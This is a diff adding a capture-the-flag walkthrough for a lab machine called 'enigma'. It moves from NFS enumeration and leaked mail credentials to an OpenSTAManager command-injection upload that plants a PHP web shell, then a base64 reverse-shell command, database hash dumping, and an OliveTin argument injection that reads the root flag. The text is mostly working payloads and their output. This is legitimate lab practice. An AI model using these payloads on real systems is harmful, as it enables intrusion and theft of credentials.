@@ -1,0 +1,100 @@
+nmap gave the following output - 
+
+Open ports: 22 (SSH), 80 (HTTP→enigma.htb), 110/995 (POP3/S), 111 (rpcbind), 143/993 (IMAP/S), 2049 (NFS)
+
+mounted the NFS - 
+sudo mount -t nfs 10.129.5.90:/srv/nfs/onboarding enigma_fs/
+
+ls -la
+...
+-rw-r--r-- 1 root root 1751 Feb 20 01:23 New_Employee_Access.pdf
+
+Password for kevin in the pdf
+
+kevin:<_REDACTED_PASSWORD_KEVIN_>
+
+curl -k $'http://mail001.enigma.htb/?_task=mail&_save=2&_uid=2&_mbox=INBOX&_action=viewsource&_token=GwZvMIB2jHVTQlwVM7fGyE3C1jNHc1YH' -H $'Host: mail001.enigma.htb' -H $'Upgrade-Insecure-Requests: 1' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' -H $'Referer: http://mail001.esnigma.htb/?_task=mail&_mbox=INBOX' -H $'Accept-Encoding: gzip, deflate' -H $'Accept-Language: en-US,en;q=0.9' -H $'Cookie: roundcube_sessid=mmh3bed2dss...; roundcube_sessauth=3i4AIpz5Y0AfBWzsvgJxm....'
+
+password reuse for sarah
+
+curl -k $'http://mail001.enigma.htb/?_task=mail&_save=1&_uid=4&_mbox=INBOX&_action=viewsource&_token=bEmh6DNeZdF6S84QUFBSNSpV2g01k5mu' -H $'Host: mail001.enigma.htb' -H $'Upgrade-Insecure-Requests: 1' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' -H $'Referer: http://mail001.enigma.htb/?_task=mail&_mbox=INBOX' -H $'Accept-Encoding: gzip, deflate' -H $'Accept-Language: en-US,en;q=0.9' -H $'Cookie: colorMode=dark; roundcube_sessid=rt2uq9oiriq...; roundcube_sessauth=Clh9qkhGUmccruJs5hmfRAFcQa-17...'
+
+Return-Path: <it@enigma.htb>
+X-Original-To: sarah@localhost
+Delivered-To: sarah@localhost
+Received: from enigma (localhost [127.0.0.1])
+        by enigma (Postfix) with ESMTP id C123C211B9
+        for <sarah@localhost>; Wed, 18 Feb 2026 21:42:51 +0000 (UTC)
+Date: Thu, 19 Feb 2026 10:22:00 +0000
+Subject: Re: OpenSTAManager Access Request
+From: it@enigma.htb
+To: sarah@enigma.htb
+Message-Id: <osm-reply-001@enigma.htb>
+In-Reply-To: <osm-request-001@enigma.htb>
+References: <osm-request-001@enigma.htb>
+
+Hi Sarah,
+
+Apologies for the delay. I have provisioned your access. Please find the details below:
+
+URL: http://support_001.enigma.htb
+Username: admin
+Password: <_REDACTED_ADMIN_PASS_>
+
+Note: I will create a dedicated account for you shortly, for now you can use the admin account to get started.
+
+Regards,
+IT Support
+Enigma Corp
+
+
+OpenSTAManagerVersion 2.9.8 (5ff39df9b)
+
+vulnerability one - SQL Injection ( no lead ) 
+
+vulnerability two - OS command injection through P7m file processing- 
+
+curl -k $'http://support_001.enigma.htb/actions.php' -X $'POST' -H $'Host: support_001.enigma.htb' -H $'Content-Length: 757' -H $'X-Requested-With: XMLHttpRequest' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36' -H $'Accept: */*' -H $'Content-Type: multipart/form-data; boundary=----WebKitFormBoundarymzXGaQPy4qUQkiYM' -H $'Origin: http://support_001.enigma.htb' -H $'Referer: http://support_001.enigma.htb/controller.php?id_module=14' -H $'Accept-Encoding: gzip, deflate' -H $'Accept-Language: en-US,en;q=0.9' -H $'Cookie: PHPSESSID=pismospt21co7b....' --data-binary $'------WebKitFormBoundarymzXGaQPy4qUQkiYM\x0d\x0aContent-Disposition: form-data; name="blob1"; filename="exploit.zip"\x0d\x0aContent-Type: application/zip\x0d\x0a\x0d\x0aPK\x03\x04\x14\x00\x00\x00\x00\x00ht\xdc\\\xd1O\x1b\xae\x0d\x00\x00\x00\x0d\x00\x00\x00S\x00\x00\x00invoice.p7m";cd files && echo "<?php system($_GET[\'c\']); ?>" > shell.php;echo ".p7mDUMMY_CONTENTPK\x01\x02\x14\x03\x14\x00\x00\x00\x00\x00ht\xdc\\\xd1O\x1b\xae\x0d\x00\x00\x00\x0d\x00\x00\x00S\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x80\x01\x00\x00\x00\x00invoice.p7m";cd files && echo "<?php system($_GET[\'c\']); ?>" > shell.php;echo ".p7mPK\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00\x81\x00\x00\x00~\x00\x00\x00\x00\x00\x0d\x0a------WebKitFormBoundarymzXGaQPy4qUQkiYM\x0d\x0aContent-Disposition: form-data; name="op"\x0d\x0a\x0d\x0asave\x0d\x0a------WebKitFormBoundarymzXGaQPy4qUQkiYM\x0d\x0aContent-Disposition: form-data; name="id_module"\x0d\x0a\x0d\x0a14\x0d\x0a------WebKitFormBoundarymzXGaQPy4qUQkiYM\x0d\x0aContent-Disposition: form-data; name="id_plugin"\x0d\x0a\x0d\x0a48\x0d\x0a------WebKitFormBoundarymzXGaQPy4qUQkiYM--\x0d\x0a'
+
+http://support_001.enigma.htb/files/SHELL.php?c='cd /etc/passwd'
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+http://support_001.enigma.htb/files/SHELL.php?c=cat+/etc/passwd
+
+root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin _apt:x:42:65534::/nonexistent:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin messagebus:x:101:102::/nonexistent:/usr/sbin/nologin systemd-resolve:x:992:992:systemd Resolver:/:/usr/sbin/nologin pollinate:x:102:1::/var/cache/pollinate:/bin/false polkitd:x:991:991:User for polkitd:/:/usr/sbin/nologin syslog:x:103:104::/nonexistent:/usr/sbin/nologin uuidd:x:104:105::/run/uuidd:/usr/sbin/nologin tcpdump:x:105:107::/nonexistent:/usr/sbin/nologin tss:x:106:108:TPM software stack,,,:/var/lib/tpm:/bin/false landscape:x:107:109::/var/lib/landscape:/usr/sbin/nologin fwupd-refresh:x:989:989:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin usbmux:x:108:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin sshd:x:109:65534::/run/sshd:/usr/sbin/nologin _laurel:x:999:988::/var/log/laurel:/bin/false haris:x:1000:1000:,,,:/home/haris:/bin/bash mysql:x:110:111:MySQL Server,,,:/nonexistent:/bin/false postfix:x:111:113::/var/spool/postfix:/usr/sbin/nologin dovecot:x:112:115:Dovecot mail server,,,:/usr/lib/dovecot:/usr/sbin/nologin dovenull:x:113:116:Dovecot login user,,,:/nonexistent:/usr/sbin/nologin kevin:x:1001:1001::/home/kevin:/usr/sbin/nologin sarah:x:1002:1002::/home/sarah:/usr/sbin/nologin _rpc:x:114:65534::/run/rpcbind:/usr/sbin/nologin statd:x:115:65534::/var/lib/nfs:/usr/sbin/nologin it:x:1003:1003::/home/it:/usr/sbin/nologin dhcpcd:x:100:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/false
+
+http://support_001.enigma.htb/files/SHELL.php?c=echo+<_REDACTED_REVERSE_SHELL_BASE64_>+|+base64+-d+|+bash
+
+in /var/www/html/openstamanager/config.inc.php
+DB creds: brollin:<_REDACTED_DB_PASSWORD_>
+
+mysql -u brollin -p'<_REDACTED_DB_PASSWORD_>' openstamanager
+
+SELECT username, password FROM zz_users;
+
+admin:$2y$10$rTJVUNyGG...
+haris:$2y$10$WHf1T79sx...
+
+cracked the haris hash and su - haris
+
+for local priv escalation 
+
+haris@enigma:/etc/OliveTin$ cat config.yaml
+
+title: Backup Database
+    id: backup_database
+    icon: "⛁"
+    shell: "mysqldump -u {{ db_user }} -p'{{ db_pass }}' {{ db_name }} > /opt/backups/backup.sql"
+    popupOnStart: execution-dialog
+
+command injection - "x'\'' ; cat /root/root.txt ; #"
+
+curl -s -X POST \
+  -H "Content-Type: application/json" \
+  -d '{"actionId":"backup_database","arguments":[
+    {"name":"db_user","value":"backup_svc"},
+    {"name":"db_pass","value":"x'\'' ; cat /root/root.txt ; #"},
+    {"name":"db_name","value":"production"}
+  ]}' \
+  http://127.0.0.1:1337/api/olivetin.api.v1.OliveTinApiService/StartActionAndWait
+
